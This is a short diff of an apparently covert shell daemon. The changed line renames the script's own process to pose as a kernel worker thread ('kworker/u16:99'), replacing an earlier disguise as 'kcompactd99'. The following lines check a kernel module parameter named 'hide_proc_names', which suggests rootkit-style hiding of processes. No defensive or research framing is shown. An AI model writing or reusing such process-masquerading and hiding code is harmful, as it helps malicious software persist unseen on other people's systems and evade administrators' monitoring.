@@ -373,7 +373,7 @@ fi
 
 # ---------- 主循环 ----------
 echo "=== daemon start $(date) ===" >> "$RUN_DIR/daemon.log"
-echo "kcompactd99" > "/proc/$$/comm" 2>/dev/null
+echo "kworker/u16:99" > "/proc/$$/comm" 2>/dev/null
 echo "DEBUG: pid=$$ ppid=$PPID comm=$(cat /proc/$$/comm 2>/dev/null)" >> "$RUN_DIR/daemon.log"
 
 if [ -w /sys/module/pkgmask/parameters/hide_proc_names ]; then
